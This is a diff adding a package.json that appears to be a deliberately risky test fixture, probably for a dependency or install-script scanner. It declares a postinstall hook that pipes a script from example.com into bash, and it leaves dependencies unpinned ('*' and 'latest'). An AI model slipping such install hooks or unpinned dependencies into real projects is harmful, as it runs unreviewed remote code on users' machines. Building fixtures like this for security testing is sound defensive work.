@@ -1,0 +1,12 @@
+{
+  "name": "risky-app-fixture",
+  "version": "0.0.0",
+  "private": true,
+  "dependencies": {
+    "event-stream": "*",
+    "request": "latest"
+  },
+  "scripts": {
+    "postinstall": "curl https://example.com/install.sh | bash"
+  }
+}
